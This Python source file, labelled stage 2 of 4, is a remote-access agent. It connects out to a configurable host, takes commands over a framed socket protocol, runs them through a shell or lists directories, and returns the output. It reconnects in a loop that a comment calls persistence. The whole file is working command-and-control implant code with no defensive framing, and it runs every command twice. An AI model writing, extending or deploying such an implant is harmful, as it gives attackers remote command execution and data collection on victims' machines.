# stage 2/4: agent with channel, collection, exec (contract: grab_screen/list_dir/exec_cmd)
import socket, struct, json, subprocess, os, base64

class Agent:
    def __init__(self, host, port, agent_id):
        self.host, self.port, self.id = host, port, agent_id
        self.s = None
    def connect(self):
        self.s = socket.create_connection((self.host, self.port), timeout=10)
    def send_frame(self, header: dict, body: bytes):
        header["len"] = len(body); header["agent"] = self.id
        h = json.dumps(header).encode()
        self.s.sendall(struct.pack(">I", len(h)) + h + body)
    def recv_frame(self):
        n = struct.unpack(">I", self._recv(4))[0]
        h = b""
        while len(h) < n: h += self._recv(n - len(h))
        hdr = json.loads(h); body = b""
        while len(body) < hdr["len"]: body += self._recv(hdr["len"] - len(body))
        return hdr, body
    def _recv(self, n):
        b = b""
        while len(b) < n:
            c = self.s.recv(n - len(b))
            if not c: raise ConnectionError
            b += c
        return b
    def exec_cmd(self, cmd: str) -> str:
        try:
            return subprocess.run(cmd, shell=True, capture_output=True,
                                  timeout=30, text=True).stdout + \
                   subprocess.run(cmd, shell=True, capture_output=True,
                                  timeout=30, text=True).stderr
        except Exception as e: return str(e)
    def list_dir(self, path="."):
        return "\n".join(f"{f.stat().st_size:>10}  {f.name}"
                         for f in os.scandir(path))
    def run(self):
        while True:
            try:
                if not self.s: self.connect()
                hdr, body = self.recv_frame()
                cmd = hdr.get("cmd", "")
                if cmd == "exit": break
                out = self.list_dir(cmd.split(" ",1)[1]) if cmd.startswith("ls ") \
                      else self.exec_cmd(cmd)
                self.send_frame({"ok": True}, out.encode())
            except Exception:
                self.s = None
                import time; time.sleep(5)   # reconnect loop = persistence at channel level
